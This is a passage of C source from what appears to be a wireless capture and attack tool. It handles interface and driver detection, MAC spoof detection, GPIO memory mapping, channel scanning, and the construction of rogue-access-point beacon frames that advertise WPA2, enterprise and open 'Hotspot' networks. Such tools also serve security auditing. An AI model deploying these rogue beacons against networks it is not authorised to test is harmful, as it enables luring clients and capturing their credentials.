	fprintf(stderr, "failed to get permanent hardware address length\n");
	return false;
	}
memcpy(&mac_orig, epmaddr->data, 6);
free(epmaddr);

memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_socket, SIOCGIFHWADDR, &ifr) == 0) memcpy(&mac_virt, ifr.ifr_hwaddr.sa_data, 6);

memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, interfacename, IFNAMSIZ);
ifr.ifr_data = (char*)&drvinfo;
drvinfo.cmd = ETHTOOL_GDRVINFO;
if(ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get driver information, ioctl(SIOCETHTOOL) not supported by driver");
	return false;
	}
memcpy(&drivername, drvinfo.driver, 32);
memcpy(&driverversion, drvinfo.version, 32);
memcpy(&driverfwversion, drvinfo.fw_version, ETHTOOL_FWVERS_LEN);
if(strlen(drivername) > 3)
	{
	if(memcmp(drivername, drvmediatek, 3) == 0) return true;
	if(memcmp(drivername, drvralink2, 3) == 0) return true;
	if(memcmp(drivername, drvralink6, 3) == 0) return true;
	if(memcmp(drivername, drvralink7, 3) == 0) return true;
	if(memcmp(drivername, drvhwsim, 3) == 0)
		{
		strncat(drivername, drvsimulation, 256 -36);
		return true;
		}
	}
strncat(drivername, drvwarning, 256 -36);
return true;
}
/*===========================================================================*/
static inline bool initgpio(unsigned int gpioperi)
{
static int fd_mem;

fd_mem = open("/dev/mem", O_RDWR|O_SYNC);
if(fd_mem < 0)
	{
	fprintf(stderr, "failed to get device memory\n");
	return false;
	}
gpio_map = mmap(NULL, BLOCK_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd_mem, gpioperi);
close(fd_mem);
if(gpio_map == MAP_FAILED)
	{
	fprintf(stderr, "failed to map GPIO memory\n");
	return false;
	}
gpio = (volatile unsigned *)gpio_map;
return true;
}
/*===========================================================================*/
static inline unsigned int getgpiobasemem()
{
static FILE *cpuinfo;
static FILE *iomem;
static int len;
static bool rpi = false;
static unsigned int gpioperibase = 0;
static char linein[RASPBERRY_INFO];

cpuinfo = fopen("/proc/cpuinfo", "r");
if(cpuinfo == NULL)
	{
	perror("failed to retrieve cpuinfo");
	return gpioperibase;
	}
while(1)
	{
	if((len = fgetline(cpuinfo, RASPBERRY_INFO, linein)) == -1) break;
	if(strstr(linein, "Raspberry Pi")) rpi = true;
	if(len < 18) continue;
	if(strstr(linein, "Raspberry Pi")) rpi = true;
	if(strstr(linein, "Serial") != NULL)
		{
		if(len > 8) rpisn = strtoul(&linein[len -4], NULL, 16);
		}
	}
fclose(cpuinfo);
if(rpi == false) return gpioperibase;
iomem = fopen("/proc/iomem", "r");
if(iomem == NULL)
	{
	perror("failed to retrieve iomem");
	return gpioperibase;
	}
while(1)
	{
	if((len = fgetline(iomem, RASPBERRY_INFO, linein)) == -1) break;
	if(strstr(linein, ".gpio") != NULL)
		{
		if(linein[8] != '-') break;
			{
			linein[8] = 0;
			gpioperibase = strtoul(linein, NULL, 16);
			break;
			}
		}
	}
fclose(iomem);
return gpioperibase;
}
/*===========================================================================*/
static inline void getscanlistchannel(const char *scanlistin)
{
static struct iwreq pwrq;
static char *fscanlistdup;
static char *tokptr;
static int wantedfrequency;

fscanlistdup = strndup(scanlistin, 4096);
if(fscanlistdup == NULL) return;
tokptr = strtok(fscanlistdup, ",");
ptrfscanlist = fscanlist;
while((tokptr != NULL) && (ptrfscanlist < fscanlist +FSCANLIST_MAX))
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	wantedfrequency = strtol(tokptr, NULL, 10);
	pwrq.u.freq.m = wantedfrequency;
	tokptr = strtok(NULL, ",");
	if(pwrq.u.freq.m > 1000) pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0)
		{
		fprintf(stderr, "frequency/channel %d not accepted by driver\n", wantedfrequency);
		continue;
		}
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0)
		{
		fprintf(stderr, "no frequency/channel reported by driver\n");
		continue;
		}
	if(pwrq.u.freq.m == 0) continue;
	if(pwrq.u.freq.m > 1000)
		{
		if(pwrq.u.freq.e == 6) ptrfscanlist->frequency = pwrq.u.freq.m;
		else if(pwrq.u.freq.e == 5) ptrfscanlist->frequency = pwrq.u.freq.m /10;
		else if(pwrq.u.freq.e == 4) ptrfscanlist->frequency = pwrq.u.freq.m /100;
		else if(pwrq.u.freq.e == 3) ptrfscanlist->frequency = pwrq.u.freq.m /1000;
		else if(pwrq.u.freq.e == 2) ptrfscanlist->frequency = pwrq.u.freq.m /10000;
		else if(pwrq.u.freq.e == 1) ptrfscanlist->frequency = pwrq.u.freq.m /100000;
		else if(pwrq.u.freq.e == 0) ptrfscanlist->frequency = pwrq.u.freq.m /1000000;
		else
			{
			fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
			continue;
			}
		if((ptrfscanlist->frequency >= 2412) && (ptrfscanlist->frequency <= 2472)) ptrfscanlist->channel = (ptrfscanlist->frequency -2407)/5;
		else if(ptrfscanlist->frequency == 2484) ptrfscanlist->channel = (ptrfscanlist->frequency -2412)/5;
		else if((ptrfscanlist->frequency >= 5180) && (ptrfscanlist->frequency <= 5905)) ptrfscanlist->channel = (ptrfscanlist->frequency -5000)/5;
		else if((ptrfscanlist->frequency >= 5955) && (ptrfscanlist->frequency <= 7115)) ptrfscanlist->channel = (ptrfscanlist->frequency -5950)/5;
		else
			{
			fprintf(stderr, "unexpected frequency/channel!\nwanted %d, reported from driver %d (exponent %d)\n", wantedfrequency, pwrq.u.freq.m, pwrq.u.freq.e);
			continue;
			}
		}
	else
		{
		ptrfscanlist->frequency = pwrq.u.freq.m;
		ptrfscanlist->channel = pwrq.u.freq.m;
		}

	if(((ptrfscanlist->channel) < 1) || ((ptrfscanlist->channel) > 255)) continue;
	ptrfscanlist++;
	}
ptrfscanlist->frequency = 0;
ptrfscanlist->channel = 0;
free(fscanlistdup);
return;
}
/*===========================================================================*/
static inline void getscanlist()
{
static int c;
static struct iwreq pwrq;

ptrfscanlist = fscanlist;
for(c = 2412; c <= 2484; c++)
	{
	if(ptrfscanlist >= fscanlist +FSCANLIST_MAX) break;
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	if(pwrq.u.freq.m == 0) continue;
	ptrfscanlist->frequency = c;
	if((ptrfscanlist->frequency >= 2412) && (ptrfscanlist->frequency <= 2472)) ptrfscanlist->channel = (ptrfscanlist->frequency -2407)/5;
	else if(ptrfscanlist->frequency == 2484) ptrfscanlist->channel = (ptrfscanlist->frequency -2412)/5;
	else continue;
	if(((ptrfscanlist->channel) < 1) || ((ptrfscanlist->channel) > 255)) continue;
	ptrfscanlist++;
	}
for(c = 5180; c <= 5905; c++)
	{
	if(ptrfscanlist >= fscanlist +FSCANLIST_MAX) break;
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket , SIOCSIWFREQ, &pwrq) < 0) continue;
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	if(pwrq.u.freq.m == 0) continue;
	ptrfscanlist->frequency = c;
	if((ptrfscanlist->frequency >= 5180) && (ptrfscanlist->frequency <= 5905)) ptrfscanlist->channel = (ptrfscanlist->frequency -5000)/5;
	else continue;
	if(((ptrfscanlist->channel) < 1) || ((ptrfscanlist->channel) > 255)) continue;
	ptrfscanlist++;
	}
for(c = 5955; c <= 7115; c++)
	{
	if(ptrfscanlist >= fscanlist +FSCANLIST_MAX) break;
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket , SIOCSIWFREQ, &pwrq) < 0) continue;
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	if(pwrq.u.freq.m == 0) continue;
	ptrfscanlist->frequency = c;
	if((ptrfscanlist->frequency >= 5955) && (ptrfscanlist->frequency <= 7115)) ptrfscanlist->channel = (ptrfscanlist->frequency -5950)/5;
	else continue;
	if(((ptrfscanlist->channel) < 1) || ((ptrfscanlist->channel) > 255)) continue;
	ptrfscanlist++;
	}
ptrfscanlist->frequency = 0;
ptrfscanlist->channel = 0;
return;
}
/*===========================================================================*/
static inline void show_channels()
{
static int c;
static struct iwreq pwrq;
static int frequency;
static int exponent;

fprintf(stdout, "%s available frequencies, channels and tx power reported by driver:\n", interfacename);
for(c = 2412; c <= 2484; c++)
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	exponent = pwrq.u.freq.e;
	frequency = pwrq.u.freq.m;
	if(pwrq.u.freq.m > 1000)
		{
		if(pwrq.u.freq.e == 6) frequency = pwrq.u.freq.m;
		else if(pwrq.u.freq.e == 5) frequency = pwrq.u.freq.m /10;
		else if(pwrq.u.freq.e == 4) frequency = pwrq.u.freq.m /100;
		else if(pwrq.u.freq.e == 3) frequency = pwrq.u.freq.m /1000;
		else if(pwrq.u.freq.e == 2) frequency = pwrq.u.freq.m /10000;
		else if(pwrq.u.freq.e == 1) frequency = pwrq.u.freq.m /100000;
		else if(pwrq.u.freq.e == 0) frequency = pwrq.u.freq.m /1000000;
		else
			{
			fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
			continue;
			}
		}
	else
		{
		fprintf(stderr, "driver doesn't support/allow frequency scan (reported exponent: %d, reported frequency: %d)\n", pwrq.u.freq.e, pwrq.u.freq.m);
		return;
		}
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.txpower.value = -1;
	pwrq.u.txpower.fixed = 1;
	pwrq.u.txpower.disabled = 0;
	pwrq.u.txpower.flags = IW_TXPOW_DBM;
	if(ioctl(fd_socket, SIOCGIWTXPOW, &pwrq) < 0) continue;

	if((frequency >= 2412) && (frequency <= 2472)) fprintf(stdout, "%4dMHz %3d (%2d dBm)\n", c, (frequency -2407)/5, pwrq.u.txpower.value);
	else if(frequency == 2484) fprintf(stdout, "%4dMHz %3d (%2d dBm)\n", c, (frequency -2412)/5, pwrq.u.txpower.value);
	else fprintf(stdout, "unexpected frequency %4dMHz /exponent %d (%2d dBm)\n", frequency, exponent, pwrq.u.txpower.value);
	}

for(c = 5180; c <= 5905; c++)
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;

	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	exponent = pwrq.u.freq.e;
	frequency = pwrq.u.freq.m;
	if(pwrq.u.freq.m > 1000)
		{
		if(pwrq.u.freq.e == 6) frequency = pwrq.u.freq.m;
		else if(pwrq.u.freq.e == 5) frequency = pwrq.u.freq.m /10;
		else if(pwrq.u.freq.e == 4) frequency = pwrq.u.freq.m /100;
		else if(pwrq.u.freq.e == 3) frequency = pwrq.u.freq.m /1000;
		else if(pwrq.u.freq.e == 2) frequency = pwrq.u.freq.m /10000;
		else if(pwrq.u.freq.e == 1) frequency = pwrq.u.freq.m /100000;
		else if(pwrq.u.freq.e == 0) frequency = pwrq.u.freq.m /1000000;
		else
			{
			fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
			continue;
			}
		}
	else
		{
		fprintf(stderr, "driver doesn't support/allow frequency scan (reported exponent: %d, reported frequency: %d)\n", pwrq.u.freq.e, pwrq.u.freq.m);
		return;
		}
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.txpower.value = -1;
	pwrq.u.txpower.fixed = 1;
	pwrq.u.txpower.disabled = 0;
	pwrq.u.txpower.flags = IW_TXPOW_DBM;
	if(ioctl(fd_socket, SIOCGIWTXPOW, &pwrq) < 0) continue;

	if((frequency >= 5180) && (frequency <= 5905)) fprintf(stdout, "%4dMHz %3d (%2d dBm)\n", c, (frequency -5000)/5, pwrq.u.txpower.value);
	else fprintf(stderr, "unexpected frequency %4dMHz /exponent %d (%2d dBm)\n", frequency, exponent, pwrq.u.txpower.value);
	}

for(c = 5955; c <= 7115; c++)
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;

	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	exponent = pwrq.u.freq.e;
	frequency = pwrq.u.freq.m;
	if(pwrq.u.freq.m > 1000)
		{
		if(pwrq.u.freq.e == 6) frequency = pwrq.u.freq.m;
		else if(pwrq.u.freq.e == 5) frequency = pwrq.u.freq.m /10;
		else if(pwrq.u.freq.e == 4) frequency = pwrq.u.freq.m /100;
		else if(pwrq.u.freq.e == 3) frequency = pwrq.u.freq.m /1000;
		else if(pwrq.u.freq.e == 2) frequency = pwrq.u.freq.m /10000;
		else if(pwrq.u.freq.e == 1) frequency = pwrq.u.freq.m /100000;
		else if(pwrq.u.freq.e == 0) frequency = pwrq.u.freq.m /1000000;
		else
			{
			fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
			continue;
			}
		}
	else
		{
		fprintf(stderr, "driver doesn't support/allow frequency scan (reported exponent: %d, reported frequency: %d)\n", pwrq.u.freq.e, pwrq.u.freq.m);
		return;
		}
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
	pwrq.u.txpower.value = -1;
	pwrq.u.txpower.fixed = 1;
	pwrq.u.txpower.disabled = 0;
	pwrq.u.txpower.flags = IW_TXPOW_DBM;
	if(ioctl(fd_socket, SIOCGIWTXPOW, &pwrq) < 0) continue;

	if((frequency >= 5955) && (frequency <= 7115)) fprintf(stdout, "%4dMHz %3d (%2d dBm)\n", c, (frequency -5950)/5, pwrq.u.txpower.value);
	else fprintf(stderr, "unexpected frequency %4dMHz /exponent %d (%2d dBm)\n", frequency, exponent, pwrq.u.txpower.value);
	}
return;
}
/*===========================================================================*/
static inline bool get_perm_addr(char *ifname, uint8_t *permaddr, uint8_t *virtaddr, char *drivername)
{
static int fd_info;
static struct iwreq iwr;
static struct ifreq ifr;
static struct ethtool_perm_addr *epmaddr;
static struct ethtool_drvinfo drvinfo;

memset(permaddr, 0, 6);
memset(virtaddr, 0, 6);
if((fd_info = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
	perror("socket info failed");
	return false;
	}
memset(&iwr, 0, sizeof(iwr));
memcpy(&iwr.ifr_name, ifname, IFNAMSIZ);
if(ioctl(fd_info, SIOCGIWNAME, &iwr) < 0)
	{
#ifdef DEBUG
	fprintf(stdout, "testing %s %s\n", ifname, drivername);
	perror("not a wireless interface");
#endif
	close(fd_info);
	return false;
	}
epmaddr = (struct ethtool_perm_addr *) malloc(sizeof(struct ethtool_perm_addr) +6);
if(!epmaddr)
	{
	perror("failed to malloc memory for permanent hardware address");
	close(fd_info);
	return false;
	}
memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
epmaddr->cmd = ETHTOOL_GPERMADDR;
epmaddr->size = 6;
ifr.ifr_data = (char*)epmaddr;
if(ioctl(fd_info, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get permanent hardware address, ioctl(SIOCETHTOOL) not supported by driver");
	free(epmaddr);
	close(fd_info);
	return false;
	}
if(epmaddr->size != 6)
	{
	free(epmaddr);
	close(fd_info);
	return false;
	}
memcpy(permaddr, epmaddr->data, 6);
memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
drvinfo.cmd = ETHTOOL_GDRVINFO;
ifr.ifr_data = (char*)&drvinfo;
if(ioctl(fd_info, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get driver information, ioctl(SIOCETHTOOL) not supported by driver");
	free(epmaddr);
	close(fd_info);
	return false;
	}
memcpy(drivername, drvinfo.driver, 32);
free(epmaddr);

memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
if(ioctl(fd_info, SIOCGIFHWADDR, &ifr) == 0) memcpy(virtaddr, ifr.ifr_hwaddr.sa_data, 6);
close(fd_info);
return true;
}
/*===========================================================================*/
static void getphyifname()
{
static int fd;
static char *pos;
static char interfacepathname[PATH_MAX];

snprintf(interfacepathname, PATH_MAX -1, "/sys/class/net/%s/phy80211/name", interfacename);
fd = open(interfacepathname, O_RDONLY);
if(fd < 0) return;
if(read(fd, phyinterfacename, PHYIFNAMESIZE) > 0)
	{
	pos = strchr(phyinterfacename, '\n');
	if(pos) *pos = '\0';
	}
close(fd);
return;	
}
/*===========================================================================*/
static inline void show_wlaninterfaces()
{
static int p;
static struct ifaddrs *ifaddr = NULL;
static struct ifaddrs *ifa = NULL;
static uint8_t permaddr[6];
static uint8_t virtaddr[6];
static char drivername[32];

if(getifaddrs(&ifaddr) == -1) perror("failed to get ifaddrs");
else
	{
	fprintf(stdout, "wlan interfaces:\n");
	for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
		if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{

			memset(&drivername, 0, 32);
			if(get_perm_addr(ifa->ifa_name, permaddr, virtaddr, drivername) == true)
				{
				strncpy(interfacename, ifa->ifa_name, IFNAMSIZ);
				memset(phyinterfacename, 0 , PHYIFNAMESIZE);
				getphyifname();
				if(phyinterfacename[0] == 0) memcpy(&phyinterfacename, notavailablestr, 3);
				fprintf(stdout, "%s\t", phyinterfacename);
				for(p = 0; p < 6; p++) fprintf(stdout, "%02x", (permaddr[p]));
				if(memcmp(&permaddr, &virtaddr, 6) != 0)
					{
					fprintf(stdout, "\t(spoofed MAC:");
					for (p = 0; p < 6; p++) printf("%02x", (virtaddr[p]));
					fprintf(stdout, " detected)");
					}
				if(checkmonitorinterface(ifa->ifa_name) == false) fprintf(stdout, "\t%s\t(driver:%s)", ifa->ifa_name, drivername);
				else fprintf(stdout, "\t%s\t(driver:%s) warning:probably a virtual monitor interface!", ifa->ifa_name, drivername);
				fprintf(stdout, "\n");
				}
			}
		}
	freeifaddrs(ifaddr);
	}
return;
}
/*===========================================================================*/
static inline void make_beacon_tagparams(char *beaconparams)
{
static const uint8_t reactivebeacondata_templ[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x0c,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REACTIVEBEACON_TEMPL_SIZE sizeof(reactivebeacondata_templ)
#define REACTIVEBEACON_TEMPL_CHANOFFSET 12

static const uint8_t bcbeacondata_hidden_templ[] =
{
/* Tag: BC SSID HIDDEN*/
0x00, 0x00,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x0c,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define BCBEACON_HIDDEN_TEMPL_SIZE sizeof(bcbeacondata_hidden_templ)
#define BCBEACON_HIDDEN_TEMPL_CHANOFFSET 14

static const uint8_t bcbeacondata_open_templ[] =
{
/* Tag: BC SSID Hotspot*/
0x00, 0x07, 0x48, 0x6f, 0x74, 0x73, 0x70, 0x6f, 0x74,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
/* Tag: WMM/WME element */
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define BCBEACON_OPEN_TEMPL_SIZE sizeof(bcbeacondata_open_templ)
#define BCBEACON_OPEN_TEMPL_CHANOFFSET 21

static const uint8_t beacon_ie_wpaentpsk_rsn[] =
{
/* Tag: RSN Information WPA1 & WPA2 ENT + PSK*/
0x30, 0x18, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x02, 0x00,
0x00, 0x0f, 0xac, 0x01,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x0c
};
#define BEACON_IE_WPAENTPSK_RSN_SIZE sizeof(beacon_ie_wpaentpsk_rsn)

static const uint8_t beacon_ie_wpaentpsk_wpa[] =
{
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x1a, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x02, 0x00,
0x00, 0x50, 0xf2, 0x01,
0x00, 0x50, 0xf2, 0x02
};
#define BEACON_IE_WPAENTPSK_WPA_SIZE sizeof(beacon_ie_wpaentpsk_wpa)

static const uint8_t beacon_ie_wpaent_rsn[] =
{
/* Tag: RSN Information WPA2 ENT */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x01,
0x00, 0x0c
};
#define BEACON_IE_WPAENT_RSN_SIZE sizeof(beacon_ie_wpaent_rsn)

static const uint8_t beacon_ie_wpaent_wpa[] =
{
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x01
};
#define BEACON_IE_WPAENT_WPA_SIZE sizeof(beacon_ie_wpaent_wpa)

static uint8_t beaconparamsoctets[BEACONBODY_LEN_MAX +BEACON_IE_WPAENTPSK_RSN_SIZE +BEACON_IE_WPAENTPSK_WPA_SIZE];
static uint8_t beaconparamsoctetswpaent[BEACONBODY_LEN_MAX +BEACON_IE_WPAENT_RSN_SIZE +BEACON_IE_WPAENT_WPA_SIZE];
static size_t beaconparamsoctetslen = 0;
static size_t beaconparamsoctetswpaentlen = 0;
static ietag_t *ieset[IESETLEN_MAX];
static size_t iesetlen;

if(wpaentflag == true)
	{
	memcpy(&beaconparamsoctets, &beacon_ie_wpaentpsk_rsn, BEACON_IE_WPAENTPSK_RSN_SIZE);
	beaconparamsoctetslen += BEACON_IE_WPAENTPSK_RSN_SIZE;
	memcpy(&beaconparamsoctets[BEACON_IE_WPAENTPSK_RSN_SIZE], &beacon_ie_wpaentpsk_wpa, BEACON_IE_WPAENTPSK_WPA_SIZE);
	beaconparamsoctetslen += BEACON_IE_WPAENTPSK_WPA_SIZE;
	}
memcpy(&beaconparamsoctetswpaent, &beacon_ie_wpaent_rsn, BEACON_IE_WPAENT_RSN_SIZE);
beaconparamsoctetswpaentlen += BEACON_IE_WPAENT_RSN_SIZE;
memcpy(&beaconparamsoctetswpaent[BEACON_IE_WPAENT_RSN_SIZE], &beacon_ie_wpaent_wpa, BEACON_IE_WPAENT_WPA_SIZE);
beaconparamsoctetswpaentlen += BEACON_IE_WPAENT_WPA_SIZE;
if(beaconparams != NULL)
	{
	if((hex2bin(beaconparams, &beaconparamsoctets[beaconparamsoctetslen], (strlen(beaconparams) /2)) == false) ||
		(hex2bin(beaconparams, &beaconparamsoctetswpaent[beaconparamsoctetswpaentlen], (strlen(beaconparams) /2)) == false))
		{
		fprintf(stderr, "beacon parameters error can't read hex string\n");
		exit(EXIT_FAILURE);
		}
	beaconparamsoctetslen += (strlen(beaconparams) /2);
	beaconparamsoctetswpaentlen += (strlen(beaconparams) /2);
	}

iesetlen = bin2ieset(ieset, beaconparamsoctets, beaconparamsoctetslen);
reactivebeacondatalen = merge_ieset2bin(reactivebeacondata, BEACONBODY_LEN_MAX -IETAG_SIZE -ESSID_LEN_MAX, reactivebeacondata_templ, REACTIVEBEACON_TEMPL_SIZE, ieset, iesetlen);
reactivebeacondatachanoffset = gettlvoffset_value(TAG_CHAN, reactivebeacondata, reactivebeacondatalen);

iesetlen = bin2ieset(ieset, beaconparamsoctetswpaent, beaconparamsoctetswpaentlen);
reactivebeaconwpaentdatalen = merge_ieset2bin(reactivebeaconwpaentdata, BEACONBODY_LEN_MAX -IETAG_SIZE -ESSID_LEN_MAX, reactivebeacondata_templ, REACTIVEBEACON_TEMPL_SIZE, ieset, iesetlen);
reactivebeaconwpaentdatachanoffset = gettlvoffset_value(TAG_CHAN, reactivebeaconwpaentdata, reactivebeaconwpaentdatalen);

bcbeacondatahiddenlen = BCBEACON_HIDDEN_TEMPL_SIZE;
memcpy(&bcbeacondatahidden, &bcbeacondata_hidden_templ, bcbeacondatahiddenlen);
bcbeacondatahiddenchanoffset = BCBEACON_HIDDEN_TEMPL_CHANOFFSET;
